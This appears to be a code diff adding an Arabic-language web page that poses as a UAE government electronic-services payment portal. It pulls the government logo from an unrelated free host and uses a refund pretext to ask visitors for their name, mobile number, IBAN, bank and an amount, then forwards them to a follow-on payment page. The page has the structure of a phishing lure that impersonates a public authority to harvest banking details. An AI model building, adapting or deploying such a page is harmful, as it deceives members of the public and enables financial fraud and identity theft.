@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
+
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="بوابة دفع قيمة الخدمات الإلكترونية">
+  <meta property="og:description" content="خدمة دفع إلكترونية موحدة — حكومة الإمارات العربية المتحدة (تجريبية)">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://example.netlify.app/">
+  <meta property="og:image" content="https://tonfree.serv00.net/sadUae/index-files/og-uae-1200x630.jpg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="بوابة دفع قيمة الخدمات الإلكترونية">
+  <meta name="twitter:description" content="خدمة دفع إلكترونية موحدة — حكومة الإمارات العربية المتحدة (تجريبية)">
+  <meta name="twitter:image" content="https://tonfree.serv00.net/sadUae/index-files/og-uae-1200x630.jpg">
+  <link rel="icon" href="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png">
+
+  <style>
+    body{font-family:Tahoma,Arial;background:#fff;margin:0}
+    header{text-align:center;padding:20px}
+    header img{height:80px}
+    main{padding:20px}
+    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
+    label{display:block;margin-top:14px;font-weight:700}
+    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
+    button{background:#0b5320;color:#fff;border:0;font-weight:800;cursor:pointer}
+    button:hover{background:#094418}
+    footer{background:#000;color:#fff;padding:18px 20px;margin-top:30px;font-size:13px}
+    .red-text { color: red; margin-top: 8px; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار الإمارات">
+    <div class="red-text">قيمة هذه العملية: 7 دراهم</div>
+    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
+    <p>حكومة الإمارات العربية المتحدة</p>
+  </header>
+
+  <main>
+    <form id="mainForm" autocomplete="off">
+      <label for="fullName">الاسم بالكامل *</label>
+      <input id="fullName" required>
+
+      <label for="mobile">رقم الجوال *</label>
+      <input id="mobile" type="tel" placeholder="05XXXXXXXX" required>
+
+      <label for="iban">رقم الآيبان *</label>
+      <input id="iban" type="text" placeholder="رقم الآيبان" required>
+
+      <label for="bank">ادخل البنك الخاص بك *</label>
+      <select id="bank" required>
+        <option value="">— اختر البنك —</option>
+        <option>بنك أبوظبي الأول</option>
+        <option>بنك أبوظبي التجاري</option>
+        <option>مصرف أبوظبي الإسلامي</option>
+        <option>بنك الإمارات دبي الوطني</option>
+      </select>
+
+      <label for="amount">ادخل المبلغ الذي تود استرجاعه *</label>
+      <input id="amount" type="number" min="1" step="0.01" placeholder="مثال: 1.00" required>
+
+      <label for="invoiceNumber">رقم المفوتر *</label>
+      <input id="invoiceNumber" type="text" inputmode="numeric" maxlength="6" required>
+
+      <button type="submit">التالي</button>
+    </form>
+  </main>
+
+  <footer>© حكومة الإمارات 2025</footer>
+
+  <script>
+    document.getElementById('mainForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      const amount = document.getElementById('amount').value.trim();
+      if (parseFloat(amount || '0') < 1) { alert('المبلغ يجب أن يكون على الأقل درهم واحد'); return; }
+      const invoice = document.getElementById('invoiceNumber').value.trim();
+      if (invoice.length > 6 || !/^[0-9]*$/.test(invoice)) { alert('رقم المفوتر يجب أن يكون رقم ولا يتجاوز 6 أرقام'); return; }
+      window.location.href = 'pay.html';
+    });
+  </script>
+</body>
+</html>
